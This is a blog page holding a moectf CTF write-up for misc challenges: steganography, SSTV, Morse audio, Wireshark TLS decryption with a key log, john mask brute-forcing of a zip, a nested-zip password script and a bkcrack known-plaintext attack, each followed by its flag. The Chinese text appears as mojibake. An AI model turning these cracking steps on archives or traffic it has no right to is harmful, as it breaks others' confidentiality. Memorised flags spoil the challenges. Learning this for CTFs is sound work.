<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>moectf wp | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="moectf1.misc1.Miscå…¥é—¨æŒ‡åŒ—ä¸‹è½½é™„ä»¶ç›´æ¥æœmoe,æŠŠé‚£ä¸€ä¸²å¤åˆ¶å³å¯  1moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;  2.ez_LSBzstegä¸€æŠŠæ¢­  12The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;moectf&amp;#1">
<meta property="og:type" content="article">
<meta property="og:title" content="moectf wp">
<meta property="og:url" content="https://hllttz.github.io/2025/09/09/moectf-wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="moectf1.misc1.Miscå…¥é—¨æŒ‡åŒ—ä¸‹è½½é™„ä»¶ç›´æ¥æœmoe,æŠŠé‚£ä¸€ä¸²å¤åˆ¶å³å¯  1moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;  2.ez_LSBzstegä¸€æŠŠæ¢­  12The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;moectf&amp;#1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="d:\typora_pic\image-20250809112218538.png">
<meta property="og:image" content="d:\typora_pic\image-20250809113628584.png">
<meta property="og:image" content="d:\typora_pic\image-20250809120047593.png">
<meta property="og:image" content="d:\typora_pic\image-20250809151755692.png">
<meta property="og:image" content="d:\typora_pic\1.png">
<meta property="og:image" content="d:\typora_pic\OIP.webp">
<meta property="og:image" content="d:\typora_pic\image-20250810182019080.png">
<meta property="og:image" content="d:\typora_pic\image-20250817145859586.png">
<meta property="og:image" content="d:\typora_pic\image-20250817145939375.png">
<meta property="og:image" content="d:\typora_pic\image-20250817151553263.png">
<meta property="og:image" content="d:\typora_pic\image-20250817151850739.png">
<meta property="og:image" content="d:\typora_pic\image-20250818155612936.png">
<meta property="og:image" content="d:\typora_pic\image-20250818155634286.png">
<meta property="og:image" content="d:\typora_pic\image-20250818162540911.png">
<meta property="og:image" content="d:\typora_pic\image-20250818163543529.png">
<meta property="og:image" content="d:\typora_pic\image-20250818210745588.png">
<meta property="og:image" content="d:\typora_pic\image-20250818211034187.png">
<meta property="og:image" content="d:\typora_pic\repaired_fbe8722b511145ecad90cadde51fda34.png">
<meta property="og:image" content="d:\typora_pic\26892102415759ae63b08714fdd2249a.jpg">
<meta property="og:image" content="d:\typora_pic\image-20250823114215490.png">
<meta property="og:image" content="d:\typora_pic\46580d66ba2a82ff87f299d4bc4ddba0_720.png">
<meta property="og:image" content="d:\typora_pic\image-20250823140730622.png">
<meta property="og:image" content="d:\typora_pic\image-20250823140946052.png">
<meta property="og:image" content="d:\typora_pic\hidden.png">
<meta property="og:image" content="d:\typora_pic\image-20250824011337699.png">
<meta property="og:image" content="d:\typora_pic\image-20250824011458606.png">
<meta property="og:image" content="d:\typora_pic\image-20250907151003455.png">
<meta property="og:image" content="d:\typora_pic\image-20250907201208507.png">
<meta property="og:image" content="d:\typora_pic\image-20250907201821971.png">
<meta property="og:image" content="d:\typora_pic\image-20250907210356136.png">
<meta property="og:image" content="d:\typora_pic\image-20250907214513598.png">
<meta property="og:image" content="d:\typora_pic\image-20250809121015426.png">
<meta property="og:image" content="d:\typora_pic\image-20250809121931944.png">
<meta property="og:image" content="d:\typora_pic\image-20250809121248333.png">
<meta property="og:image" content="d:\typora_pic\image-20250809122757377.png">
<meta property="og:image" content="d:\typora_pic\image-20250809123248455.png">
<meta property="og:image" content="d:\typora_pic\image-20250809123453770.png">
<meta property="og:image" content="d:\typora_pic\image-20250809123531835.png">
<meta property="og:image" content="d:\typora_pic\image-20250809123653460.png">
<meta property="og:image" content="d:\typora_pic\image-20250809123849635.png">
<meta property="og:image" content="d:\typora_pic\image-20250809143941431.png">
<meta property="og:image" content="d:\typora_pic\image-20250809144034515.png">
<meta property="og:image" content="d:\typora_pic\image-20250809144242769.png">
<meta property="og:image" content="d:\typora_pic\image-20250809135901469.png">
<meta property="og:image" content="d:\typora_pic\image-20250809135953559.png">
<meta property="og:image" content="d:\typora_pic\image-20250809140130385.png">
<meta property="og:image" content="d:\typora_pic\image-20250809142856382.png">
<meta property="og:image" content="d:\typora_pic\image-20250810004954772.png">
<meta property="og:image" content="d:\typora_pic\image-20250810005040285.png">
<meta property="og:image" content="d:\typora_pic\image-20250817193945350.png">
<meta property="og:image" content="d:\typora_pic\image-20250817194413325.png">
<meta property="og:image" content="d:\typora_pic\image-20250817194921962.png">
<meta property="og:image" content="d:\typora_pic\image-20250817200041374.png">
<meta property="og:image" content="d:\typora_pic\image-20250817201323830.png">
<meta property="og:image" content="d:\typora_pic\image-20250817202417483.png">
<meta property="og:image" content="d:\typora_pic\image-20250817203437631.png">
<meta property="og:image" content="d:\typora_pic\image-20250818122234649.png">
<meta property="og:image" content="d:\typora_pic\image-20250818122316633.png">
<meta property="og:image" content="d:\typora_pic\image-20250818144543604.png">
<meta property="og:image" content="d:\typora_pic\image-20250823221837890.png">
<meta property="og:image" content="d:\typora_pic\image-20250823155706531.png">
<meta property="og:image" content="d:\typora_pic\image-20250826123741833.png">
<meta property="og:image" content="d:\typora_pic\image-20250826162619117.png">
<meta property="og:image" content="d:\typora_pic\image-20250826162804026.png">
<meta property="og:image" content="d:\typora_pic\image-20250826162919848.png">
<meta property="og:image" content="d:\typora_pic\image-20250826171107490.png">
<meta property="og:image" content="d:\typora_pic\image-20250907122553225.png">
<meta property="og:image" content="d:\typora_pic\image-20250907122617458.png">
<meta property="og:image" content="d:\typora_pic\image-20250907125325998.png">
<meta property="og:image" content="d:\typora_pic\image-20250907131432404.png">
<meta property="og:image" content="d:\typora_pic\image-20250809145935983.png">
<meta property="og:image" content="d:\typora_pic\image-20250809161214353.png">
<meta property="og:image" content="d:\typora_pic\image-20250810010221104.png">
<meta property="og:image" content="d:\typora_pic\image-20250809155539550.png">
<meta property="article:published_time" content="2025-09-09T13:31:42.000Z">
<meta property="article:modified_time" content="2025-09-09T14:03:53.484Z">
<meta property="article:author" content="hllttz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="d:\typora_pic\image-20250809112218538.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS è®¢é˜…"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="æœç´¢"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="æœç´¢"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://hllttz.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-moectf-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/09/moectf-wp/" class="article-date">
  <time class="dt-published" datetime="2025-09-09T13:31:42.000Z" itemprop="datePublished">2025-09-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      moectf wp
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="moectf"><a href="#moectf" class="headerlink" title="moectf"></a>moectf</h1><h2 id="1-misc"><a href="#1-misc" class="headerlink" title="1.misc"></a>1.misc</h2><h3 id="1-Miscå…¥é—¨æŒ‡åŒ—"><a href="#1-Miscå…¥é—¨æŒ‡åŒ—" class="headerlink" title="1.Miscå…¥é—¨æŒ‡åŒ—"></a>1.<strong>Miscå…¥é—¨æŒ‡åŒ—</strong></h3><p>ä¸‹è½½é™„ä»¶ç›´æ¥æœmoe,æŠŠé‚£ä¸€ä¸²å¤åˆ¶å³å¯</p>
<p><img src="D:\typora_pic\image-20250809112218538.png" alt="image-20250809112218538"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-ez-LSB"><a href="#2-ez-LSB" class="headerlink" title="2.ez_LSB"></a>2.<strong>ez_LSB</strong></h3><p>zstegä¸€æŠŠæ¢­</p>
<p><img src="D:\typora_pic\image-20250809113628584.png" alt="image-20250809113628584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;</span><br><span class="line">moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-sstv"><a href="#3-sstv" class="headerlink" title="3.sstv"></a>3.sstv</h3><p>æ‰¾ä¸€ä¸ªèƒ½è§£ç sstvçš„å³å¯</p>
<p><img src="D:\typora_pic\image-20250809120047593.png" alt="image-20250809120047593"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d3codiNG_SStV_reQu1REs-PATI3nC3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-æ‚ä½ä¸€åªè€³"><a href="#4-æ‚ä½ä¸€åªè€³" class="headerlink" title="4.æ‚ä½ä¸€åªè€³"></a>4.<strong>æ‚ä½ä¸€åªè€³</strong></h3><p>ç”¨audacityæ‰“å¼€</p>
<p><img src="D:\typora_pic\image-20250809151755692.png" alt="image-20250809151755692"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.._. ._.. ._ __.  .. ... ___... .... ._  ._.. .._. ..__._  ._. ._ _.. .. ___ ..__._ ..  _. ..__._ _.._  _..  .._</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. .- ..--.- -..- -.. ..-</span><br></pre></td></tr></table></figure>

<p>è§£ç å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLAGIS:HALF_RADIO_IN_XDU</span><br><span class="line">moectf&#123;HALF_RADIO_IN_XDU&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-Enchantment"><a href="#5-Enchantment" class="headerlink" title="5.Enchantment"></a>5.<strong>Enchantment</strong></h3><p>wiresharkæ‰“å¼€,å…ˆç”¨http.request.method &#x3D;&#x3D; â€œPOSTâ€æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶,é€‰ä¸­Portable Network Graphicså¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ</p>
<p><img src="D:\typora_pic\1.png" alt="1"></p>
<p>é“¶æ²³å­—æ¯è§£å¯†å³å¯</p>
<p><img src="D:\typora_pic\OIP.webp" alt="a"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">theflagisbelow nowyouhave mastered enchanting</span><br><span class="line">moectf&#123;now_you_have_mastered_enchanting&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-ez-png"><a href="#6-ez-png" class="headerlink" title="6.ez_png"></a>6.<strong>ez_png</strong></h3><p>ç”¨binwalkè¿‡ä¸€é,å°±å‡ºæ¥äº†</p>
<p><img src="D:\typora_pic\image-20250810182019080.png" alt="image-20250810182019080"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-ez-é”Ÿæ–¤æ‹·"><a href="#7-ez-é”Ÿæ–¤æ‹·" class="headerlink" title="7.ez_é”Ÿæ–¤æ‹·????"></a>7.<strong>ez_é”Ÿæ–¤æ‹·????</strong></h3><p>gbkè½¬utf8å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-ez-ssl"><a href="#8-ez-ssl" class="headerlink" title="8.ez_ssl"></a>8.<strong>ez_ssl</strong></h3><p>å¯¼å‡ºhttpå¯¹è±¡,å‘ç°ä¸Šä¼ äº†ssl.log</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary1EV4LSnnRBL8OzyB</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ssl.log&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">CLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</span><br><span class="line">CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</span><br><span class="line">CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</span><br><span class="line">CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary1EV4LSnnRBL8OzyB--</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†è¿™ä¸ªssl.log,æˆ‘ä»¬å°±å¯ä»¥è§£å¯†httpsæµé‡</p>
<ol>
<li><p>æ‰“å¼€ Wireshark â†’ <strong>Edit â†’ Preferences â†’ Protocols â†’ TLS</strong></p>
</li>
<li><p>åœ¨ <strong>(Pre)-Master-Secret log filename</strong> å¡«å…¥ <code>ssl.log</code> æ–‡ä»¶è·¯å¾„</p>
</li>
<li><p>Wireshark å°±èƒ½è‡ªåŠ¨ç”¨é‡Œé¢çš„å¯†é’¥è§£å¯† TLS æµé‡ï¼Œæ˜¾ç¤º HTTP&#x2F;HTTPS æ˜æ–‡</p>
</li>
</ol>
<p>æµè§ˆæµé‡åŒ…,å‘ç°å­˜åœ¨ä¸Šä¼ æµé‡</p>
<p><img src="D:\typora_pic\image-20250817145859586.png" alt="image-20250817145859586"></p>
<p><img src="D:\typora_pic\image-20250817145939375.png" alt="image-20250817145939375"></p>
<p>å¯è§ä¸Šä¼ äº†flag.zip,å¯†ç ä¸ºçº¯7ä½æ•°å­—,å¯¼å‡ºè§£å‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john 1.zip &gt; hash.txt</span><br><span class="line">john --format=zip --mask=?d?d?d?d?d?d?d hash.txt</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250817151553263.png" alt="image-20250817151553263"></p>
<p>6921682</p>
<p>ookè§£å¯†å³å¯</p>
<p><img src="D:\typora_pic\image-20250817151850739.png" alt="image-20250817151850739"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-encrypted-pdf"><a href="#9-encrypted-pdf" class="headerlink" title="9.encrypted_pdf"></a>9.<strong>encrypted_pdf</strong></h3><p>ä¸‹è½½å¾—åˆ°åŠ å¯†çš„pdf,æ”¾åœ¨ilovepdfé‡Œè§£å¯†<img src="D:\typora_pic\image-20250818155612936.png" alt="image-20250818155612936"></p>
<p>çŸ¢é‡åŒ–pdf,<a target="_blank" rel="noopener" href="https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870">https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870</a></p>
<p><img src="D:\typora_pic\image-20250818155634286.png" alt="image-20250818155634286"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-ä¸‡é‡ŒæŒ‘ä¸€"><a href="#10-ä¸‡é‡ŒæŒ‘ä¸€" class="headerlink" title="10.ä¸‡é‡ŒæŒ‘ä¸€"></a>10.<strong>ä¸‡é‡ŒæŒ‘ä¸€</strong></h3><p>ä¸€ä¸‡ä¸ªå‹ç¼©åŒ…é‡Œæ‰¾åˆ°ä¸€ä¸ªæ­£ç¡®çš„å¯†ç ,è§£å‹lock.zip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·¯å¾„é…ç½®</span></span><br><span class="line">lock_zip = <span class="string">r&quot;D:\Problems\moe\1\lock.zip&quot;</span></span><br><span class="line">password_zip = <span class="string">r&quot;D:\Problems\moe\1\password.zip&quot;</span></span><br><span class="line">extract_root = <span class="string">r&quot;D:\Problems\moe\1\extracted&quot;</span></span><br><span class="line">lock_extract_dir = <span class="string">r&quot;D:\Problems\moe\1\unlocked&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£åˆ™åŒ¹é… &quot;The password is:&quot; åé¢çš„å†…å®¹</span></span><br><span class="line">password_pattern = <span class="string">r&#x27;The password is:\s*(\S+)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•ç”¨å¯†ç è§£é” lock.zip ä¸­çš„ flag.zipï¼ˆæ”¯æŒ AES åŠ å¯†ï¼‰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_unlock_flag_zip</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> pyzipper.AESZipFile(lock_zip) <span class="keyword">as</span> zf:</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> zf.namelist():</span><br><span class="line">                <span class="keyword">if</span> name.lower().endswith(<span class="string">&#x27;flag.zip&#x27;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;å°è¯•è§£é” <span class="subst">&#123;name&#125;</span>ï¼Œä½¿ç”¨å¯†ç  <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                    zf.extract(name, path=lock_extract_dir, pwd=password.encode())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸè§£å‹ <span class="subst">&#123;name&#125;</span>ï¼å¯†ç : <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç  <span class="subst">&#123;password&#125;</span> è§£é”å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€’å½’æå– password.zip ä¸­ pwd.txt å¹¶å°è¯•è§£é” flag.zip</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_extract_password</span>(<span class="params">zip_path, extract_to</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_path) <span class="keyword">as</span> zf:</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> zf.namelist():</span><br><span class="line">                file_path = os.path.join(extract_to, name)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœæ˜¯ pwd.txt</span></span><br><span class="line">                <span class="keyword">if</span> name.lower().endswith(<span class="string">&#x27;pwd.txt&#x27;</span>):</span><br><span class="line">                    os.makedirs(os.path.dirname(file_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                    zf.extract(name, extract_to)</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        content = f.read()</span><br><span class="line">                        <span class="keyword">match</span> = re.search(password_pattern, content)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                            password = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ°å¯†ç : <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">if</span> try_unlock_flag_zip(password):</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœæ˜¯ zip æ–‡ä»¶ï¼Œé€’å½’å¤„ç†</span></span><br><span class="line">                <span class="keyword">elif</span> name.lower().endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                    os.makedirs(os.path.dirname(file_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                    zf.extract(name, extract_to)</span><br><span class="line">                    <span class="keyword">if</span> recursive_extract_password(file_path, os.path.join(extract_to, os.path.splitext(name)[<span class="number">0</span>])):</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç† <span class="subst">&#123;zip_path&#125;</span> å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¿…è¦ç›®å½•</span></span><br><span class="line">os.makedirs(extract_root, exist_ok=<span class="literal">True</span>)</span><br><span class="line">os.makedirs(lock_extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹é€’å½’æå–å¯†ç å¹¶å°è¯•è§£é” flag.zip</span></span><br><span class="line">success = recursive_extract_password(password_zip, extract_root)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°æœ‰æ•ˆå¯†ç ï¼Œflag.zip æœªè§£é”ã€‚&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250818162540911.png" alt="image-20250818162540911"></p>
<p>å¯†ç ä¸ºa296a5ec1385f394e8cb</p>
<p><img src="D:\typora_pic\image-20250818163543529.png" alt="image-20250818163543529"></p>
<p>å·²çŸ¥æ˜æ–‡.exeå’Œflag.txtåŠ å¯†ç±»å‹ä¸ºéƒ½ä¸ºZipCrypto Store,å°è¯•æ˜æ–‡æ”»å‡»,å…ˆæ”»å‡»æ˜æ–‡.exe</p>
<p>é¦–å…ˆå‡†å¤‡æ˜æ–‡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot;</span> | xxd -r -ps &gt; mingwen</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œæ”»å‡»</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag.zip -c æ˜æ–‡.exe -p mingwen -o 102 &gt; 1.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250818210745588.png" alt="image-20250818210745588"></p>
<p>å¾—åˆ°keys</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Keys: eec878a3 6808e48f 3aa41bd8</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»flag.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d decrypted_flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250818211034187.png" alt="image-20250818211034187"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;</span><br></pre></td></tr></table></figure>





<h3 id="11-rush"><a href="#11-rush" class="headerlink" title="11.rush"></a>11.rush</h3><p>è¡¥å…¨å®šä½ç¬¦å³å¯</p>
<p><img src="D:\typora_pic\repaired_fbe8722b511145ecad90cadde51fda34.png" alt="ä¿®å¤åå›¾åƒ"></p>
<p><img src="D:\typora_pic\26892102415759ae63b08714fdd2249a.jpg" alt="26892102415759ae63b08714fdd2249a"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;</span><br></pre></td></tr></table></figure>

<h3 id="12-weird-photo"><a href="#12-weird-photo" class="headerlink" title="12.weird_photo"></a>12.<strong>weird_photo</strong></h3><p>æ”¹å®½å³å¯</p>
<p><img src="D:\typora_pic\image-20250823114215490.png" alt="image-20250823114215490"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Image_Height_Restored&#125;</span><br></pre></td></tr></table></figure>

